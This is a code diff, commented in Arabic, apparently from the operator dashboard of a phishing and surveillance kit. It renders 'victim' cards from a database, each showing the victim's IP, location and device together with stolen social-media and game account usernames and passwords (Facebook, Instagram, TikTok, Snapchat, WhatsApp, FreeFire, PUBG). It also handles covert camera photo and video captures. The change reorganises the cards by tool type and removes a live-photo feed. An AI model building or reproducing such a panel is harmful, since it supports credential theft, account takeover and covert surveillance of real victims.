@@ -992,7 +992,7 @@ async function openToolPage(toolValue) {
     loadVictims(toolValue, user);
 }
 
-    // ✅ دالة loadVictims المعدلة - مع عرض الـ Live
+    // ✅ دالة loadVictims المعدلة - كل أداة تظهر بياناتها بس
 function loadVictims(tool, user) {
     const victimRef = db.ref('hits/' + user); 
     
@@ -1004,45 +1004,88 @@ function loadVictims(tool, user) {
             playNotificationSound(); 
             snap.forEach(child => {
                 const data = child.val();
-                if (!tool || data.tool === tool) {
-                    list.innerHTML += `
-                        <div class="victim-card" style="padding:12px; border:1px solid var(--primary); margin-bottom:10px; border-radius:8px; background: rgba(0,242,255,0.02); text-align:right; font-size:13px; color: #fff;">
-                            <div style="display:flex; justify-content:space-between; color:var(--primary); font-weight:bold; margin-bottom:5px;">
-                                <span>📡 IP: ${data.ip || 'Unknown'}</span>
-                                <span>⏰ ${formatTime(data.timestamp) || ''}</span>
-                            </div>
-                            📍 <b>الموقع:</b> ${data.location || 'غير معروف'}<br>
-                            📱 <b>الجهاز:</b> ${data.device || 'غير معروف'}<br>
-                            🌐 <b>المتصفح:</b> <small style="color:#888;">${data.browser ? data.browser.substring(0, 30) + '...' : 'غير معروف'}</small>
-                            ${data.tool ? `<br>🛠️ <b>الأداة:</b> ${getToolName(data.tool)}` : ''}
-                            ${data.user ? `<br>📧 <b>الحساب:</b> ${data.user}` : ''}
-                            ${data.pass ? `<br>🔑 <b>الباسورد:</b> ${data.pass}` : ''}
-                            ${data.id || data.playerID ? `<br>🆔 <b>الايدي:</b> ${data.id || data.playerID}` : ''}
-                        </div>
-                    `;
+                
+                // ✅ الأهم: فلترة البيانات حسب الأداة فقط
+                if (data.tool === tool) {
+                    
+                    // ✅ كارت موحد لكل الأدوات
+                    let cardHTML = `<div class="victim-card" style="padding:12px; border:1px solid var(--primary); margin-bottom:10px; border-radius:8px; background: rgba(0,242,255,0.02); text-align:right; font-size:13px; color: #fff;">`;
+                    
+                    // العنوان المشترك
+                    cardHTML += `<div style="display:flex; justify-content:space-between; color:var(--primary); font-weight:bold; margin-bottom:5px;">
+                                    <span>📡 IP: ${data.ip || 'Unknown'}</span>
+                                    <span>⏰ ${formatTime(data.timestamp) || ''}</span>
+                                </div>`;
+                    
+                    // الموقع والجهاز
+                    cardHTML += `📍 <b>الموقع:</b> ${data.location || 'غير معروف'}<br>`;
+                    cardHTML += `📱 <b>الجهاز:</b> ${data.device || 'غير معروف'}<br>`;
+                    cardHTML += `🌐 <b>المتصفح:</b> <small style="color:#888;">${data.browser ? data.browser.substring(0, 30) + '...' : 'غير معروف'}</small><br>`;
+                    
+                    // ✅ بيانات حسب نوع الأداة
+                    switch(data.tool) {
+                        // 📸 الكاميرات
+                        case 'fcam':
+                        case 'rcam':
+                        case 'vcam':
+                            cardHTML += `📸 <b>نوع الصورة:</b> صورة حية<br>`;
+                            break;
+                        
+                        // 🎥 الفيديوهات
+                        case 'fvid':
+                        case 'rvid':
+                            cardHTML += `🎥 <b>نوع الفيديو:</b> تسجيل مباشر<br>`;
+                            break;
+                        
+                        // 📱 معلومات الهاتف
+                        case 'info':
+                            cardHTML += `📱 <b>نوع الجهاز:</b> ${data.deviceModel || 'غير معروف'}<br>`;
+                            break;
+                        
+                        // 🎮 الألعاب
+                        case 'ff':
+                            cardHTML += `🎮 <b>اللعبة:</b> FreeFire<br>`;
+                            cardHTML += `👤 <b>الحساب:</b> ${data.user || 'غير معروف'}<br>`;
+                            cardHTML += `🔑 <b>الباسورد:</b> ${data.pass || 'غير معروف'}<br>`;
+                            cardHTML += `🆔 <b>ايدي اللاعب:</b> ${data.playerID || 'غير معروف'}<br>`;
+                            cardHTML += `💎 <b>الجواهر:</b> ${data.diamonds || 'غير معروف'}<br>`;
+                            break;
+                        
+                        case 'pubg':
+                            cardHTML += `🎮 <b>اللعبة:</b> PUBG<br>`;
+                            cardHTML += `👤 <b>الحساب:</b> ${data.user || 'غير معروف'}<br>`;
+                            cardHTML += `🔑 <b>الباسورد:</b> ${data.pass || 'غير معروف'}<br>`;
+                            cardHTML += `🆔 <b>ايدي اللاعب:</b> ${data.playerID || 'غير معروف'}<br>`;
+                            cardHTML += `💎 <b>الشدات:</b> ${data.uc || 'غير معروف'}<br>`;
+                            break;
+                        
+                        // 📱 السوشيال ميديا
+                        case 'fb':
+                        case 'inst':
+                        case 'tk':
+                        case 'snap':
+                        case 'wa':
+                            cardHTML += `🌐 <b>المنصة:</b> ${getToolName(data.tool)}<br>`;
+                            cardHTML += `👤 <b>الحساب:</b> ${data.user || data.username || 'غير معروف'}<br>`;
+                            cardHTML += `🔑 <b>الباسورد:</b> ${data.pass || data.password || 'غير معروف'}<br>`;
+                            if (data.followers) cardHTML += `👥 <b>المتابعين:</b> ${data.followers}<br>`;
+                            break;
+                        
+                        // 📍 الموقع
+                        case 'loc':
+                            cardHTML += `📍 <b>الموقع الجغرافي:</b> ${data.location || 'غير معروف'}<br>`;
+                            break;
+                    }
+                    
+                    cardHTML += `<br>🛠️ <b>الأداة:</b> ${getToolName(data.tool)}`;
+                    cardHTML += `</div>`;
+                    
+                    list.innerHTML += cardHTML;
                 }
             });
         }
     });
-    
-    // ✅ إضافة استماع للـ Live Photos
-    db.ref(`live/${user}/photos`).on('child_added', snap => {
-        const photo = snap.val();
-        const list = document.getElementById('victim-list');
-        
-        // أضف الصورة في أول القائمة
-        list.innerHTML = `
-            <div style="padding:10px; border:2px solid #ff5722; margin-bottom:10px; border-radius:8px; background: rgba(255,87,34,0.1);">
-                <div style="display:flex; justify-content:space-between; color:#ff5722;">
-                    <span>📸 صورة جديدة!</span>
-                    <span>⏰ ${photo.time}</span>
-                </div>
-                <img src="${photo.image}" style="width:100%; max-width:200px; margin-top:10px; border-radius:8px;">
-            </div>
-        ` + list.innerHTML;
-    });
 }
-
     // ✅ دالة الحصول على اسم الأداة
 function getToolName(toolValue) {
     const tool = tools.find(t => t.value === toolValue);
